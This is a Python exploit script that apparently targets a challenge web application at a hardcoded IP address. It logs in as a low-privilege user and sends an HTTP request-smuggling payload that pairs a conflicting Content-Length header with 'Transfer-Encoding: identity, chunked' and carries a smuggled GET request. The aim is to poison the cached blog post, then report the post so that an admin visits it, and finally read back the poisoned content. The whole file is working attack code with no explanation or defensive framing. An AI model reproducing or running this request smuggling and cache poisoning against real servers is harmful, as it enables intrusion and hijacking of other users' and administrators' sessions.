import requests
import time

SERVER_URL = "http://54.198.62.41"

def login_user(username, password):
    login_data = {
        "username": username,
        "password": password
    }
    r = requests.post(f"{SERVER_URL}/api/auth/login", json=login_data)
    return r.json()['token']

def smuggle_request():
    # Get user token
    user_token = login_user("user", "user123")
    print(f"\nUser token obtained: {user_token[:20]}...")

    # Create main request
    content = "X" * 5  # 5 bytes
    
    # Create smuggled request to poison cache
    smuggled = (
        "GET /api/blog/post/1 HTTP/1.1\r\n"
        f"Host: localhost\r\n"
        "Content-Type: application/json\r\n"
        "X-Special-Key: secret_cache_key\r\n"
        f"Authorization: Bearer {user_token}\r\n"
        "\r\n"
    )

    # Combine with proper chunked encoding
    body = (
        content +  # First chunk
        "\r\n0\r\n\r\n" +  # End chunk marker
        smuggled  # Smuggled request
    )

    print("\nSending smuggled request...")
    headers = {
        'Host': 'localhost',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '5',
        'Transfer-Encoding': 'identity, chunked',
        'Connection': 'keep-alive',
        'X-Special-Key': 'secret_cache_key',
        'Authorization': f'Bearer {user_token}'
    }

    try:
        r = requests.post(
            f"{SERVER_URL}/api/blog/post/1",
            headers=headers,
            data=body,
            allow_redirects=False
        )
        print(f"Initial status: {r.status_code}")
        print(f"Headers: {dict(r.headers)}")
    except Exception as e:
        print(f"Error: {e}")

    # Quick check if cache is poisoned
    print("\nChecking cache status...")
    headers = {
        'Host': 'localhost',
        'X-Special-Key': 'secret_cache_key',
        'Authorization': f'Bearer {user_token}'
    }

    r = requests.get(
        f"{SERVER_URL}/api/blog/post/1",
        headers=headers
    )
    print(f"Cache check status: {r.status_code}")
    print(f"Cache-Control: {r.headers.get('Cache-Control')}")

    # Report the post to trigger admin visit
    print("\nReporting post...")
    headers = {
        'Authorization': f'Bearer {user_token}',
        'Content-Type': 'application/json'
    }
    data = {"postId": 1}
    r = requests.post(
        f"{SERVER_URL}/api/blog/report",
        headers=headers,
        json=data
    )
    print(f"Report status: {r.status_code}")

    # Check if admin viewed it
    print("\nChecking admin response...")
    headers = {
        'Host': 'localhost',
        'X-Special-Key': 'secret_cache_key',
        'Authorization': f'Bearer {user_token}'
    }
    r = requests.get(
        f"{SERVER_URL}/api/blog/post/1",
        headers=headers
    )
    print(f"Final check status: {r.status_code}")
    print(f"Final Cache-Control: {r.headers.get('Cache-Control')}")
    print(f"Content: {r.text[:200]}")

if __name__ == "__main__":
    print("Starting smuggle + cache test...")
    smuggle_request()